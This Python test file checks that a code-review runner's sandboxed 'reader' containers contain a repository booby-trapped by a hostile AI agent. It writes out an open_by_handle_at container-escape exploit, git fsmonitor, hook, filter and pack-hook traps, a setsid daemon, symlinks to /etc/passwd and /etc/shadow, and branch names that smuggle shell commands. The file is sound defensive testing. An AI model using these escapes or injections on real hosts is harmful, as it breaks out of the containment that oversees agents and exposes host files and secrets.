# SPDX-License-Identifier: LicenseRef-Proprietary

"""A hostile repository against the real reader (#745, step 4): E15 of the plan's table.

What the agent plants in its repository (a `core.fsmonitor`, hooks, a clean filter, a pack hook)
is read by git where git is run for the runner, which is the reader: a container with no network,
no token and no other mount, under the runtime of the lane (`LANE_RUNTIME`: `sysbox-runc` on a VM
with Sysbox, `runc` in CI). Two things are proven. What git's options can stop does not start. And
what they cannot stop (a filter driver) runs in the reader and is contained: it has no network, no
socket of the Docker daemon, no file of the VM, no secret, and a call of `open_by_handle_at`, the
one a reader with `DAC_READ_SEARCH` as the VM's root could use to read and write the VM's root file
system, is refused. The refusal under `runc` is the missing capability; the one under Sysbox is
the user namespace (a VM only proves that one: this lane's `runc` has none)."""

import contextlib
import json
import os
import subprocess
import time
from pathlib import Path
from typing import Any, cast

import pytest
from fakes.wire.formats import Turn
from lane_support import (
    BRANCH,
    LaneWorkspace,
    bash,
    docker,
    lane_config,
    lane_turn,
    lane_workspace,
    model_network,
    says,
    wait_for,
    write_file,
)
from opencode_native import REAL_KEY

from code_reviewer_runner.dynamic_review.static_isolation import slot_ports
from code_reviewer_runner.implementer.agent_container import (
    AGENT_CONTAINER_NAME,
    AgentContainer,
    AgentSeams,
)
from code_reviewer_runner.implementer.git_workspace import LEFTOVER_MESSAGE
from code_reviewer_runner.implementer.reader import (
    READER_CONTAINER_NAME,
    READER_DROP_CAPABILITIES,
    READER_WRITER_CONTAINER_NAME,
)
from code_reviewer_runner.job import JobError
from git_support import TOKEN, raw

SHOCKER = r"""
import ctypes, errno, os, struct, sys
libc = ctypes.CDLL(None, use_errno=True)
def handle_of(path):
    buf = ctypes.create_string_buffer(8 + 128)
    struct.pack_into("I", buf, 0, 128)
    mount_id = ctypes.c_int()
    if libc.syscall(303, -100, path.encode(), buf, ctypes.byref(mount_id), 0) != 0:
        return None
    size, kind = struct.unpack_from("Ii", buf, 0)
    return kind, bytes(buf[8:8 + size])
def open_handle(mount_fd, kind, data):
    buf = ctypes.create_string_buffer(8 + len(data))
    struct.pack_into("Ii", buf, 0, len(data), kind)
    buf[8:8 + len(data)] = data
    fd = libc.syscall(304, mount_fd, buf, os.O_RDONLY)
    return "OPENED" if fd >= 0 else errno.errorcode.get(ctypes.get_errno(), "?")
mount_fd = os.open("/repo", os.O_RDONLY)
known = handle_of("/repo/README.md")
print("name_to_handle_at:", "ok" if known else "refused")
if known:
    kind, data = known
    print("own file:", open_handle(mount_fd, kind, data))
    forged = struct.pack("<Q", int(sys.argv[1])) + b"\0\0\0\0" + data[12:]
    print("root of the VM:", open_handle(mount_fd, kind, forged))
"""

FACTS = r"""#!/bin/sh
# What a program run by git in the reader finds out about where it is, written to $1.
{
  echo "uid: $(id -u)"
  echo "net: $(tail -n +3 /proc/net/dev | cut -d: -f1 | tr -d ' ' | tr '\n' ' ')"
  echo "work: $(ls /work 2>&1 | head -1)"
  echo "socket: $(ls /var/run/docker.sock /run/docker.sock 2>&1 | head -1)"
  echo "caps: $(grep '^CapEff' /proc/self/status | cut -f2)"
  echo "write-root: $(touch /trap-root 2>&1)"
  echo "write-volume: $(touch /repo/trap-volume 2>&1 && echo ALLOWED)"
  echo "remount-volume: $(mount -o remount,rw /repo 2>&1 && echo ALLOWED)"
  echo "write-volume-after: $(touch /repo/trap-volume-after 2>&1 && echo ALLOWED)"
  echo "remount-root: $(mount -o remount,rw / 2>&1 && echo ALLOWED)"
  echo "environment: $(env | tr '\n' ' ')"
  echo "shocker:"
  /opt/venv/bin/python -I /repo/shocker.py ROOT_INODE 2>&1
} > "$1" 2>&1
"""


def plant(repo: Path) -> None:
    """What a hostile agent leaves in its repository."""
    root_inode = str(os.stat("/").st_ino)
    (repo / "shocker.py").write_text(SHOCKER)
    (repo / "facts.sh").write_text(FACTS.replace("ROOT_INODE", root_inode))
    traps = {
        "trap-fsmonitor.sh": "/repo/facts.sh /tmp/ran-fsmonitor\nexit 0\n",
        "trap-hook.sh": "/repo/facts.sh /tmp/ran-hook\nexit 0\n",
        "trap-pack.sh": '/repo/facts.sh /tmp/ran-pack\nexec "$@"\n',
        "trap-filter.sh": "/repo/facts.sh /tmp/ran-filter-$$\nexec cat\n",
    }
    for name, body in traps.items():
        (repo / name).write_text("#!/bin/sh\n" + body)
    hooks = repo / "hooks"
    hooks.mkdir()
    for hook in ("pre-commit", "post-commit", "commit-msg", "pre-push", "post-checkout"):
        (hooks / hook).write_text("#!/bin/sh\n/repo/trap-hook.sh\n")
    for path in [*repo.glob("*.sh"), *hooks.iterdir()]:
        path.chmod(0o755)
    with (repo / ".git" / "config").open("a") as config:
        config.write(
            "[core]\n\tfsmonitor = /repo/trap-fsmonitor.sh\n\thooksPath = /repo/hooks\n"
            '[filter "trap"]\n\tclean = /repo/trap-filter.sh\n'
            "[uploadpack]\n\tpackObjectsHook = /repo/trap-pack.sh\n"
        )
    (repo / ".gitattributes").write_text("* filter=trap\n")
    # A tracked file whose content changed: git has to read it through the filter to know.
    with (repo / "README.md").open("a") as readme:
        readme.write("changed by the agent\n")


def in_reader(name: str, script: str) -> str:
    return docker("exec", name, "/bin/sh", "-c", script, check=False).stdout


def leftovers(name: str) -> list[str]:
    return in_reader(name, "ls /tmp").split()


# #745-E15
def test_a_hostile_repository_runs_nothing_the_options_can_stop_and_what_runs_is_contained(
    tmp_path: Path,
) -> None:
    with lane_workspace(tmp_path) as lane:
        workspace = lane.workspace
        plant(workspace.repo)

        # The look at the tree, the leftover commit and the final push, all through the reader.
        assert workspace.dirty() is True
        sha = workspace.commit_all()
        report = workspace.push_all(seconds=60.0)

        assert sha is not None
        assert [(b.name, b.pushed) for b in report.branches] == [(BRANCH, True)]
        assert lane.origin.tip(BRANCH) == sha
        # What an option stops did not start, in either reader: the fsmonitor, the hooks, the
        # hook of the pack.
        for reader in (READER_CONTAINER_NAME, READER_WRITER_CONTAINER_NAME):
            files = leftovers(reader)
            for trap in ("ran-fsmonitor", "ran-hook", "ran-pack"):
                assert trap not in files, (reader, trap)
        # The clean filter cannot be stopped by naming it: it ran, in the reader, and was contained.
        facts = {
            reader: in_reader(reader, "cat /tmp/ran-filter-* 2>/dev/null")
            for reader in (READER_CONTAINER_NAME, READER_WRITER_CONTAINER_NAME)
        }
        assert any(facts.values()), "the filter driver ran in a reader"
        for reader, text in facts.items():
            if text:
                contained(text, writable=reader == READER_WRITER_CONTAINER_NAME)
        # The look at the tree (`dirty`) is made in the read-only reader, and the filter ran there.
        assert facts[READER_CONTAINER_NAME], "the read-only reader ran the filter"
        # The mirror holds the commit the system made, and the runner's git config is its own.
        message = raw(
            "--git-dir", str(workspace.mirror), "log", "-1", "--format=%s", sha or "",
            git=workspace.git,
        )  # fmt: skip
        assert message == LEFTOVER_MESSAGE
        # The control: the same trap run the way git would have without the options runs, and is
        # contained all the same. Without it the options above would prove nothing.
        in_reader(
            READER_CONTAINER_NAME,
            "cd /repo && git -c safe.directory=/repo status --porcelain >/dev/null 2>&1; true",
        )
        assert "ran-fsmonitor" in leftovers(READER_CONTAINER_NAME)
        contained(
            in_reader(READER_CONTAINER_NAME, "cat /tmp/ran-fsmonitor"),
            writable=False,
            production=False,
        )


def fact(text: str, name: str) -> str:
    """The value of one line `<name>: <value>` of what a trap wrote."""
    return text.split(f"\n{name}: ", 1)[1].split("\n")[0]


def contained(text: str, *, writable: bool, production: bool = True) -> None:
    """What the facts a trap wrote say about where it ran. `production` is a command the runner
    started (its bounding set is cut to `DAC_OVERRIDE`); the control is a plain exec, which holds
    whatever the runtime gives the container's root (every capability under Sysbox) and must be
    contained all the same."""
    text = "\n" + text
    assert "uid: 0" in text
    if production:
        assert fact(text, "caps") == "0000000000000002"
    if not writable:
        # The volume is read-only for it, and no remount, with this command's capabilities or
        # without them (Sysbox: the user namespace locks the mount's flags), makes it writable.
        assert "Read-only file system" in fact(text, "write-volume")
        assert "ALLOWED" not in fact(text, "remount-volume") and fact(text, "remount-volume")
        assert "Read-only file system" in fact(text, "write-volume-after")
    assert "ALLOWED" not in fact(text, "remount-root") and fact(text, "remount-root")
    assert "net: lo " in text, "no network but loopback"
    assert "work: " in text and "No such file" in text.split("work: ")[1].split("\n")[0]
    assert "socket: " in text and "No such file" in text.split("socket: ")[1].split("\n")[0]
    assert "Read-only file system" in text.split("write-root: ")[1].split("\n")[0]
    for secret in (TOKEN, REAL_KEY):
        assert secret not in text
    # open_by_handle_at is refused, for a file of the repository and for the root of the VM.
    assert "own file: EPERM" in text or "name_to_handle_at: refused" in text
    assert "root of the VM: EPERM" in text or "name_to_handle_at: refused" in text
    assert "OPENED" not in text


DAEMON_MARK = "reader-daemon-mark"
# A clean filter that leaves a daemon behind: `setsid` puts it in a session of its own, so the end
# of the command that started it does not touch it, and it keeps changing the repository.
DAEMON_FILTER = f"""#!/bin/sh
setsid sh -c 'while :; do date +%s%N > /repo/{DAEMON_MARK}; sleep 0.05; done' > /dev/null 2>&1 &
exec cat
"""
# The processes of a reader that carry the mark (this command's own cmdline holds it in two pieces).
MARK_PATTERN = f"'{DAEMON_MARK[:7]}''{DAEMON_MARK[7:]}'"
ALIVE = (
    "for p in /proc/[0-9]*; do "
    f"tr '\\0' ' ' < $p/cmdline 2>/dev/null | grep -q {MARK_PATTERN} && echo $p; "
    "done"
)


def alive_in(reader: str) -> list[str]:
    own = in_reader(reader, "echo $$").strip()
    return [p for p in in_reader(reader, ALIVE).split() if p != f"/proc/{own}"]


def daemon_repo(repo: Path) -> None:
    (repo / "daemon-filter.sh").write_text(DAEMON_FILTER)
    (repo / "daemon-filter.sh").chmod(0o755)
    with (repo / ".git" / "config").open("a") as config:
        config.write('[filter "daemon"]\n\tclean = /repo/daemon-filter.sh\n')
    (repo / ".gitattributes").write_text("* filter=daemon\n")
    with (repo / "README.md").open("a") as readme:
        readme.write("changed by the agent\n")


# #745: a process a filter leaves in a reader is gone before the push
def test_a_process_a_filter_leaves_behind_does_not_survive_the_reset_of_the_readers(
    tmp_path: Path,
) -> None:
    with lane_workspace(tmp_path) as lane:
        workspace = lane.workspace
        daemon_repo(workspace.repo)

        assert workspace.dirty() is True
        sha = workspace.commit_all()

        assert sha is not None
        # The daemon the commit's filter started lives on in the reader that can write, and goes on
        # changing the repository: this is what the reset is for.
        assert wait_for(lambda: bool(alive_in(READER_WRITER_CONTAINER_NAME))), "the control"
        first = (workspace.repo / DAEMON_MARK).read_text()
        assert wait_for(lambda: (workspace.repo / DAEMON_MARK).read_text() != first), "it writes"

        assert workspace.quiet_readers(seconds=30.0) is True

        for reader in (READER_CONTAINER_NAME, READER_WRITER_CONTAINER_NAME):
            assert alive_in(reader) == [], reader
        last = (workspace.repo / DAEMON_MARK).read_text()
        time.sleep(0.5)
        assert (workspace.repo / DAEMON_MARK).read_text() == last, "nothing writes any more"
        # The readers are back: the push goes through them.
        report = workspace.push_all(seconds=60.0)
        assert [(b.name, b.pushed) for b in report.branches] == [(BRANCH, True)]
        assert lane.origin.tip(BRANCH) == sha


# #745: DAC_OVERRIDE is what the readers keep because the agent's other users own files
def test_what_the_agents_other_users_own_is_committed_with_the_one_capability_the_readers_keep(
    tmp_path: Path,
) -> None:
    with lane_workspace(tmp_path) as lane:
        workspace = lane.workspace
        repo = workspace.repo
        private = repo / "private.txt"
        private.write_text("mode 600, owned by another user\n")
        private.chmod(0o600)
        data = repo / "pgdata"
        data.mkdir()
        (data / "PG_VERSION").write_text("18\n")
        data.chmod(0o700)
        for path in (private, data / "PG_VERSION", data):
            os.chown(path, 999, 999)

        assert workspace.dirty() is True
        sha = workspace.commit_all()
        report = workspace.push_all(seconds=60.0)

        assert sha is not None
        assert [(b.name, b.pushed) for b in report.branches] == [(BRANCH, True)]
        tree = raw(
            "--git-dir", str(workspace.mirror), "ls-tree", "-r", "--name-only", sha,
            git=workspace.git,
        )  # fmt: skip
        assert "private.txt" in tree.split() and "pgdata/PG_VERSION" in tree.split()


# #745: the end of a whole turn does it: the system commits the leftover, the filter starts a daemon
# in the reader that can write, and nothing of it is alive when the push has been made
def test_a_daemon_the_leftover_commit_starts_in_a_reader_is_gone_when_the_turn_has_pushed(
    tmp_path: Path,
) -> None:
    def script(repo: Path) -> list[Turn]:
        return [
            write_file(repo, "df.sh", DAEMON_FILTER),
            write_file(repo, ".gitattributes", "* filter=daemon\n"),
            bash("chmod +x df.sh && git config filter.daemon.clean /repo/df.sh"),
            write_file(repo, "notes.txt"),
            says("Done."),
            says("I will not commit."),
        ]

    with lane_turn(tmp_path, script) as turned:
        result = turned.result

        assert result.ok, (result.error_code, result.error_detail, result.notes)
        assert [c.subject for c in result.commits] == [LEFTOVER_MESSAGE]
        assert result.pushed and turned.origin_tip() == result.head_commit
        assert (turned.workspace.repo / DAEMON_MARK).exists(), "the filter ran: the control"
        for reader in (READER_CONTAINER_NAME, READER_WRITER_CONTAINER_NAME):
            assert alive_in(reader) == [], reader
        mark = (turned.workspace.repo / DAEMON_MARK).read_text()
        time.sleep(0.5)
        assert (turned.workspace.repo / DAEMON_MARK).read_text() == mark, "nothing writes any more"


# -- what the agent plants in `.git` and in the tree, against the real reader (#745, step 6) ------
#
# Control never opens a path in the agent's repository: the reader does, a container with no
# network, no token and no other mount. So what a hostile repository can do is bounded by the
# reader: it may fail a command (a named outcome, never a hang of the turn), and it must not make
# the commit or the push carry anything that is not the agent's own tree.

SCRATCH_ROOTS = {
    "etc",
    "usr",
    "opt",
    "proc",
    "sys",
    "bin",
    "lib",
    "lib64",
    "var",
    "dev",
    "run",
    "tmp",
    "sbin",
    "home",
    "root",
}
# A string that is in the reader's own /etc/passwd and in no file of the agent's tree.
READER_ONLY = "root:x:0:0"


def commit_before(lane: LaneWorkspace, name: str = "before.txt") -> str:
    """What the agent committed before it turned hostile."""
    repo = lane.workspace.repo
    (repo / name).write_text("committed before\n")
    git = lane.workspace.git
    raw("add", "-A", cwd=repo, git=git)
    raw(
        "-c", "user.name=a", "-c", "user.email=a@example.invalid", "commit", "-qm", "Before",
        cwd=repo, git=git,
    )  # fmt: skip
    return raw("rev-parse", "HEAD", cwd=repo, git=git)


def pushed_entries(lane: LaneWorkspace, branch: str = BRANCH) -> list[str]:
    """`<mode> <path>` of every entry of the tree that arrived at the origin."""
    tip = lane.origin.tip(branch)
    if tip is None:
        return []
    listing = raw("ls-tree", "-r", tip, cwd=lane.origin.path, git=lane.origin.git)
    return [f"{line.split()[0]} {line.split(chr(9), 1)[1]}" for line in listing.splitlines()]


def origin_holds(lane: LaneWorkspace, needle: str, branch: str = BRANCH) -> bool:
    tip = lane.origin.tip(branch)
    if tip is None:
        return False
    done = subprocess.run(
        [lane.origin.git, "-C", str(lane.origin.path), "grep", "-q", "-F", needle, tip],
        capture_output=True,
        check=False,
    )
    return done.returncode == 0


def finish(
    lane: LaneWorkspace, *, commit_seconds: float, push_seconds: float
) -> tuple[bool, float]:
    """The end of a turn as the runner does it for the repository: the leftover commit (a failure is
    noted, not raised), the readers made quiet, the push. Returns whether the commit worked and
    how long it all took."""
    began = time.monotonic()
    committed = True
    try:
        lane.workspace.commit_all(seconds=commit_seconds)
    except JobError:
        committed = False
    assert lane.workspace.quiet_readers(seconds=30.0) is True
    lane.workspace.push_all(seconds=push_seconds)
    return committed, time.monotonic() - began


def processes_in(reader: str) -> int:
    return len([name for name in in_reader(reader, "ls /proc").split() if name.isdigit()])


# #745-S6-01
def test_a_worktree_pointed_outside_the_repository_never_carries_the_readers_files(
    tmp_path: Path,
) -> None:
    with lane_workspace(tmp_path) as lane:
        commit_before(lane)
        with (lane.workspace.repo / ".git" / "config").open("a") as config:
            config.write("[core]\n\tworktree = /\n")
        (lane.workspace.repo / "agent-file.txt").write_text("the agent's change\n")

        committed, _ = finish(lane, commit_seconds=40.0, push_seconds=60.0)

        entries = pushed_entries(lane)
        names = [entry.split(" ", 1)[1] for entry in entries]
        # The reader's own root file system is not the agent's tree: not one of its directories
        # (nor its /etc/passwd) is in what arrived.
        assert not [n for n in names if n.split("/")[0] in SCRATCH_ROOTS], names[:10]
        assert not origin_holds(lane, READER_ONLY)
        # What the agent committed before arrived. The leftover commit may fail (the agent made git
        # look somewhere else): if it worked it holds the agent's file and nothing else.
        assert "before.txt" in names, names[:10]
        assert not committed or "agent-file.txt" in names, (committed, names[:10])


# #745-S6-02
def test_symlinks_the_agent_plants_are_committed_as_links_and_never_followed(
    tmp_path: Path,
) -> None:
    with lane_workspace(tmp_path) as lane:
        repo = lane.workspace.repo
        commit_before(lane)
        for name, target in {
            "to-passwd": "/etc/passwd",
            "to-root": "/",
            "to-parent": "../../../..",
            "to-itself": "to-itself",
            "to-work": "/work",
        }.items():
            (repo / name).symlink_to(target)
        # Files git reads for its own rules, as links to a file of the reader.
        (repo / ".gitignore").symlink_to("/etc/passwd")
        (repo / ".gitattributes").symlink_to("/etc/passwd")
        (repo / "dir").mkdir()
        (repo / "dir" / ".gitignore").symlink_to("/etc/shadow")

        committed, _ = finish(lane, commit_seconds=40.0, push_seconds=60.0)

        entries = pushed_entries(lane)
        links = {e.split(" ", 1)[1] for e in entries if e.startswith("120000")}
        assert committed
        assert {"to-passwd", "to-root", "to-parent", "to-itself", "to-work"} <= links, entries
        # A link is committed as its target text; the file behind it never was read.
        assert not origin_holds(lane, READER_ONLY)
        tip = lane.origin.tip(BRANCH) or ""
        assert (
            raw("cat-file", "-p", f"{tip}:to-passwd", cwd=lane.origin.path, git=lane.origin.git)
            == "/etc/passwd"
        )


def plant_fifo_as_config(repo: Path) -> None:
    config = repo / ".git" / "config"
    config.unlink()
    os.mkfifo(config)


def plant_fifo_as_head(repo: Path) -> None:
    head = repo / ".git" / "HEAD"
    head.unlink()
    os.mkfifo(head)


def plant_garbage_head(repo: Path) -> None:
    (repo / ".git" / "HEAD").write_text("ref: refs/heads/../../../../etc/passwd\n")


def plant_symlink_head(repo: Path) -> None:
    head = repo / ".git" / "HEAD"
    head.unlink()
    head.symlink_to("/etc/passwd")


def plant_alternates(repo: Path) -> None:
    info = repo / ".git" / "objects" / "info"
    info.mkdir(parents=True, exist_ok=True)
    (info / "alternates").write_text("/proc\n/etc\n../../../..\n/repo/../../\n")


def plant_symlink_refs(repo: Path) -> None:
    heads = repo / ".git" / "refs" / "heads"
    (heads / "evil-passwd").symlink_to("/etc/passwd")
    (heads / "evil-environ").symlink_to("/proc/self/environ")
    (heads / "evil-loop").symlink_to("evil-loop")


def plant_packed_refs_garbage(repo: Path) -> None:
    (repo / ".git" / "packed-refs").write_text(
        "# pack-refs\nnot a sha refs/heads/x\n\x00\x01\x02\n"
    )


def plant_worktrees_and_modules(repo: Path) -> None:
    """Pointers the repository's own layout can hold: a linked worktree whose gitdir is a file of
    the reader, and a module whose path is outside."""
    git_dir = repo / ".git" / "worktrees" / "evil"
    git_dir.mkdir(parents=True)
    (git_dir / "gitdir").write_text("/etc/passwd\n")
    (git_dir / "HEAD").write_text("ref: refs/heads/main\n")
    (repo / ".git" / "commondir").write_text("/\n")


# Each hostile layout, and whether the repository can still be read afterwards (a FIFO where git
# reads its config blocks the read: the outcome is then a named failure inside the time limits).
HOSTILE_LAYOUTS = [
    ("alternates_to_the_readers_files", plant_alternates, True),
    ("symlinked_refs_to_files_of_the_reader", plant_symlink_refs, True),
    ("garbage_packed_refs", plant_packed_refs_garbage, False),
    ("garbage_head", plant_garbage_head, False),
    ("head_as_a_symlink_to_a_file", plant_symlink_head, False),
    ("worktree_and_commondir_pointers", plant_worktrees_and_modules, False),
    ("fifo_as_config", plant_fifo_as_config, False),
    ("fifo_as_head", plant_fifo_as_head, False),
]


# #745-S6-03
@pytest.mark.parametrize(
    ("planter", "readable"),
    [pytest.param(p, r, id=i) for i, p, r in HOSTILE_LAYOUTS],
)
def test_a_hostile_git_directory_ends_the_end_of_the_turn_inside_its_limits_and_leaks_nothing(
    tmp_path: Path, planter: object, readable: bool
) -> None:
    with lane_workspace(tmp_path) as lane:
        commit_before(lane)
        assert callable(planter)
        planter(lane.workspace.repo)

        committed, seconds = finish(lane, commit_seconds=8.0, push_seconds=25.0)

        report = lane.workspace.push_report()
        # Bounded: the three reads (commit 8 s, list 20 s, the reset) and nothing that waits for a
        # FIFO or a loop for ever.
        assert seconds < 90.0, seconds
        # Nothing of the reader's files arrived, whatever else happened.
        assert not origin_holds(lane, READER_ONLY)
        names = [e.split(" ", 1)[1] for e in pushed_entries(lane)]
        assert not [n for n in names if n.split("/")[0] in SCRATCH_ROOTS]
        if readable:
            assert report.listed and lane.origin.tip(BRANCH) is not None, (committed, report)
            assert "before.txt" in names
        else:
            # An unreadable repository is a named outcome: not listed (with a reason), or no branch.
            assert (not report.listed and report.list_problem) or not report.pushed_any or names
        # No process of the hostile command is left behind once the readers were made quiet (the
        # last list of the push may be blocked in the reader that was made quiet before it): only
        # the init, its sleep and the command that counts.
        assert lane.workspace.quiet_readers(seconds=30.0) is True
        for reader in (READER_CONTAINER_NAME, READER_WRITER_CONTAINER_NAME):
            assert processes_in(reader) <= 4, reader


# #745-S6-04
def test_a_file_too_big_to_hash_in_the_time_is_a_failed_commit_and_the_earlier_work_still_arrives(
    tmp_path: Path,
) -> None:
    with lane_workspace(tmp_path) as lane:
        commit_before(lane)
        with (lane.workspace.repo / "huge.bin").open("wb") as handle:
            handle.truncate(1 << 40)  # 1 TiB of nothing: sparse, and git has to read all of it
        (lane.workspace.repo / "small.txt").write_text("and a small one\n")

        committed, seconds = finish(lane, commit_seconds=10.0, push_seconds=40.0)

        assert not committed, (
            "the leftover commit does not finish in 10 s and is said to have failed"
        )
        assert seconds < 70.0, seconds
        # What the agent had committed arrives, and neither the huge file nor the small one that
        # went with it in the same failed commit.
        names = [e.split(" ", 1)[1] for e in pushed_entries(lane)]
        assert "before.txt" in names and "huge.bin" not in names and "small.txt" not in names, names
        for reader in (READER_CONTAINER_NAME, READER_WRITER_CONTAINER_NAME):
            assert processes_in(reader) <= 4, reader


# #745-S6-05
def test_branch_names_that_would_be_options_or_commands_are_dropped_and_nothing_runs(
    tmp_path: Path,
) -> None:
    with lane_workspace(tmp_path) as lane:
        tip = commit_before(lane)
        heads = lane.workspace.repo / ".git" / "refs" / "heads"
        hostile = [
            "--upload-pack=touch${IFS}pwned-by-name",
            "-fexec=touch",
            "+force",
            "new\nline",
            "a b",
            "x;touch${IFS}pwned-by-name",
            "$(touch${IFS}pwned-by-name)",
            "tab\there",
        ]
        for name in hostile:
            (heads / name).write_text(tip + "\n")
        (heads / "fine-branch").write_text(tip + "\n")
        # Give "fine-branch" something of its own so that it is worth pushing.
        raw(
            "update-ref",
            "refs/heads/fine-branch",
            tip,
            cwd=lane.workspace.repo,
            git=lane.workspace.git,
        )

        _, _ = finish(lane, commit_seconds=20.0, push_seconds=60.0)

        # Names that are legal in git ("x;touch" and "$(touch)" are) arrive as the plain argument
        # they are; a name that is an option or holds a space or a line end is dropped.
        sent = set(lane.origin.branches())
        assert not [n for n in sent if "/-" in n or "/+" in n or " " in n or "\n" in n or "\t" in n]
        assert "refs/heads/fine-branch" in sent or "fine-branch" in sent, sent
        # The commands those names spell would have created this file, in the repository (the
        # reader's working directory) or where the tests run.
        assert not (lane.workspace.repo / "pwned-by-name").exists()
        assert not Path("pwned-by-name").exists()
        for reader in (READER_CONTAINER_NAME, READER_WRITER_CONTAINER_NAME):
            assert "pwned-by-name" not in in_reader(reader, "ls /tmp /repo")


STATUS_FIELDS = ("CapInh", "CapPrm", "CapEff", "CapBnd", "CapAmb", "NoNewPrivs")


def status_of(reader: str, *argv: str) -> dict[str, str]:
    done = docker("exec", reader, *argv, "/bin/cat", "/proc/self/status", check=False)
    fields: dict[str, str] = {}
    for line in done.stdout.splitlines():
        key, _, value = line.partition(":")
        if key in STATUS_FIELDS:
            fields[key] = value.strip()
    return fields


# #745-S6-06
def test_every_command_the_runner_starts_in_a_reader_holds_one_capability_and_no_new_privileges(
    tmp_path: Path,
) -> None:
    with lane_workspace(tmp_path) as lane:
        assert lane.reader.warm()
        for reader in (READER_CONTAINER_NAME, READER_WRITER_CONTAINER_NAME):
            status = status_of(reader, *READER_DROP_CAPABILITIES)
            # DAC_OVERRIDE (bit 1) and nothing else, nothing inheritable or ambient, and no way to
            # gain more: what a program the repository makes git run could ever hold.
            assert int(status["CapEff"], 16) == 0x2, (reader, status)
            assert int(status["CapPrm"], 16) == 0x2
            assert int(status["CapBnd"], 16) == 0x2
            assert int(status["CapAmb"], 16) == 0
            assert int(status["CapInh"], 16) == 0
            assert status["NoNewPrivs"] == "1"
            document = json.loads(docker("inspect", reader).stdout)[0]
            host = document["HostConfig"]
            assert host["NetworkMode"] == "none" and host["ReadonlyRootfs"] is True
            assert host["CapDrop"] == ["ALL"] and host["CapAdd"] == ["DAC_OVERRIDE"]
            assert not host.get("Privileged") and "no-new-privileges:true" in host["SecurityOpt"]
            assert [m["Destination"] for m in document["Mounts"]] == ["/repo"]


PROBE = Path(__file__).resolve().parents[2] / "scripts" / "boundary_probe.py"


def probe_in(container: str, config: dict[str, object]) -> dict[str, object]:
    """`boundary_probe.py` run as root in a container of the lane; its one result line."""
    done = subprocess.run(
        [
            "docker",
            "exec",
            "-i",
            container,
            "/usr/local/bin/python3",
            "-I",
            "-",
            json.dumps(config),
        ],
        input=PROBE.read_bytes(),
        capture_output=True,
        check=False,
        timeout=180,
    )
    for line in reversed(done.stdout.decode("utf-8", "replace").splitlines()):
        if line.startswith("PROBE_RESULT "):
            result: dict[str, object] = json.loads(line.removeprefix("PROBE_RESULT "))
            return result
    raise AssertionError(f"the probe printed no result: {done.stderr[-300:]!r}")


# #745-S6-07
def test_the_agents_container_is_sealed_no_socket_of_the_vm_and_the_repository_is_its_only_mount(
    tmp_path: Path,
) -> None:
    config = lane_config()
    with lane_workspace(tmp_path) as lane, model_network(config, slot_ports({}).proxy):
        agent = AgentContainer(
            2048,
            AgentSeams(
                hostname=lambda: lane.control,
                image=config.agent_image,
                helper_image=config.agent_image,
                runtime=config.runtime,
                entrypoint=config.entrypoint,
                ready_seconds=180.0,
            ),
        )
        agent.create()
        try:
            document = json.loads(docker("inspect", AGENT_CONTAINER_NAME).stdout)[0]
            host = document["HostConfig"]
            assert host["Privileged"] is False and not host.get("Binds")
            assert not host.get("Devices") and not host.get("CapAdd")
            assert host.get("PidMode", "") == "" and host.get("IpcMode") != "host"
            assert [m["Destination"] for m in document["Mounts"]] == ["/work/repo"]
            assert sorted(document["NetworkSettings"]["Networks"]) == ["code-reviewer-model"]
            assert host["PidsLimit"] == 16384 and host["Memory"] == 2048 * 1024 * 1024
            vm_daemon = docker("info", "--format", "{{.ID}}").stdout.strip()

            seen = probe_in(AGENT_CONTAINER_NAME, {"sections": ["sockets", "mounts", "ids"]})

            sockets = cast(
                "list[dict[str, object]]", cast("dict[str, Any]", seen["sockets"])["sockets"]
            )
            assert [s for s in sockets if s.get("daemon_id") == vm_daemon] == []
            mounts = cast("list[dict[str, str]]", cast("dict[str, Any]", seen["mounts"])["mounts"])
            words = ("docker.sock", "reserve", "mirror")
            leaks = [
                m for m in mounts if any(w in m["source"] + m["root"] + m["point"] for w in words)
            ]
            assert leaks == [] and any(m["point"] == "/work/repo" for m in mounts)
        finally:
            agent.stop()
            agent.remove()


# A tidy-up for a failed run: the planted FIFO and loop links are in a temporary directory that
# pytest removes, but a reader that still holds one blocks its removal; the lane's own sweep
# (`remove_leftovers`) removes the readers.
_ = contextlib
